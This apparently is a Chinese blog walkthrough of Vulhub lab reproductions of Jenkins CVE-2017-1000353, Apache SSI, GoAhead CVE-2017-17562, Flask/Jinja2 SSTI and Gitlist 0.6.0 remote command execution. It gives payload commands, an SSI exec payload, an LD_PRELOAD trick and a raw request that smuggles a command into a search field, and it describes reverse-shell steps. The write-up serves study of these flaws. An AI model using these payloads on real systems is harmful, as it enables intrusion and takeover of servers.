---
layout:     post
title:      Vulhub漏洞复现合集（下）
subtitle:   漏洞复现
date:       2020-10-16
author:     heria
header-img: img/post-bg-005.jpg
catalog: true
tags:
---

### CVE-2017-1000353 Jenkins-CI 远程代码执行漏洞

##### 漏洞简介及影响范围

Jenkins的反序列化漏洞，攻击者使用该漏洞可以在被攻击服务器执行任意代码，漏洞利用不需要任何的权限

漏洞影响范围：

所有Jenkins主版本均受到影响(包括<=2.56版本)
所有Jenkins LTS 均受到影响( 包括<=2.46.1版本)

##### 利用过程

生成序列化字符串

参考<https://github.com/vulhub/CVE-2017-1000353>，首先下载[CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)，这是生成POC的工具。

执行下面命令，生成字节码文件：

```bash
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "command"
# jenkins_poc.ser是生成的字节码文件名
# "command ..."是待执行的任意命令
```

生成jenkins.ser文件 作用是在tmp文件夹下创建succc文件

![image-20210402135414150](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135414150.png)

发送数据包，执行命令

下载[exploit.py](https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py)，(https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py)， python3执行`python exploit.py http://your-ip:8080 jenkins.ser`，将刚才生成的字节码文件发送给目标

![image-20210402135433864](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135433864.png)

成功创建

![image-20210402135449599](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135449599.png)

更换反弹shell代码

![image-20210402135502880](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135502880.png)

执行后未能成功建立连接

尝试创建文件 之后通过echo 写入内容

![image-20210402135517862](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135517862.png)

执行后未能成功创建

![image-20210402135537565](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135537565.png)

更换思路 通过curl 下载文件  之后bash执行

创建名为1.txt文件 写入反弹shell语句

![image-20210402135556366](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135556366.png)

开启http服务 

![image-20210402135611051](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135611051.png)

访问对应端口

![image-20210402135624959](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135624959.png)

生成下载的序列化语句

![image-20210402135645784](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135645784.png)

执行

![image-20210402135700038](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135700038.png)

成功创建

![image-20210402135717295](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135717295.png)

再次生成一个序列化语句文件  内容为执行1.sh

![image-20210402135731632](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135731632.png)

执行

![image-20210402135747007](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135747007.png)

成功建立连接

![image-20210402135758644](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135758644.png)



### Apache SSI 远程命令执行漏洞

##### 漏洞简介及影响版本

在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用`<!--#exec cmd="id" -->`语法执行任意命令。

##### 利用过程

利用后缀绕过但是无法解析

![image-20210402135817928](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135817928.png)

创建shtml文件

![image-20210402135837239](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135837239.png)

成功执行其中的ls命令

![image-20210402135848616](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135848616.png)

上传b.shtml文件 内容为

![image-20210402135904858](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135904858.png)

通过该文件创建test.sh文件 并将反弹shell指令写入test.shell文件

![image-20210402135917290](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135917290.png)

重新上传内容为bash test.sh的文件执行命令

![image-20210402135932252](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135932252.png)

成功弹shell

![image-20210402135947934](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402135947934.png)



### CVE-2017-17562 GoAhead 远程命令执行漏洞

##### 漏洞简介及影响范围

GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序，这个漏洞就出现在运行CGI程序的时候。

GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了`REMOTE_HOST`和`HTTP_AUTHORIZATION`。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，`LD_`开头的环境变量和动态链接库有关，如`LD_PRELOAD`中指定的动态链接库，将会被自动加载；`LD_LIBRARY_PATH`指定的路径，程序会去其中寻找动态链接库。

我们可以指定`LD_PRELOAD=/proc/self/fd/0`，因为`/proc/self/fd/0`是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给`http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0`，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。

##### 利用过程

我们首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在`Linux x86_64`的机器中，所以我们直接用Linux PC编译即可。

![image-20210402140005285](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140005285.png)

![image-20210402140013475](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140013475.png)

将payload.so作为post body发送,可见，`Hello: world!`已被成功输出

![image-20210402140026451](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140026451.png)

使用msfvenom生成反弹shell的c代码

![image-20210402140042537](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140042537.png)

NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。gcc -z execstack -o test test.c // 禁用NX保护

![image-20210402140105977](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140105977.png)

反弹成功

![image-20210402140124322](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140124322.png)



### Flask（Jinja2） 服务端模板注入漏洞

##### 漏洞简介及影响范围

Flask 是一个 web 框架。也就是说 Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 wdb 应用程序可以使一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。
Flask 属于微框架（micro-framework）这一类别，微架构通常是很小的不依赖于外部库的框架。这既有优点也有缺点，优点是框架很轻量，更新时依赖少，并且专注安全方面的 bug，缺点是，你不得不自己做更多的工作，或通过添加插件增加自己的依赖列表。

- Jinja 2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的
- Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 {{…}} 块
- Jinja2 模板同样支持控制语句，像在 {%…%} 块中

##### 利用过程

Web服务的代码

![image-20210402140155894](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140155894.png)

可以直接写入jinja2的模板语言 如{{233*233}}

![image-20210402140207826](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140207826.png)

修改代码后则不存在

![image-20210402140218846](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140218846.png)

执行id

![image-20210402140229284](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140229284.png)



### Gitlist 0.6.0 远程命令执行漏洞

##### 漏洞简介及影响范围

在用户对仓库中代码进行搜索的时候，gitlist将调用`git grep`命令

![image-20210402140243342](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140243342.png)

其中，`$query`是搜索的关键字，`$branch`是搜索的分支。

如果用户输入的`$query`的值是`--open-files-in-pager=id;`，将可以执行`id`命令

##### 利用过程

环境启动后，访问`http://your-ip:8080`将看到一个名为example的仓库。

![image-20210402140258984](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140258984.png)

发送数据包

```
POST /example/tree/a/search HTTP/1.1 Host: your-ip:8080 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Length: 56 query=--open-files-in-pager=touch /tmp/
```

![image-20210402140323457](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140323457.png)

进入容器查看

![image-20210402140350312](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140350312.png)

使用ping dnslog测试

![image-20210402140413268](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210402140413268.png)

参考链接：https://www.cnblogs.com/NPFS/p/13279815.html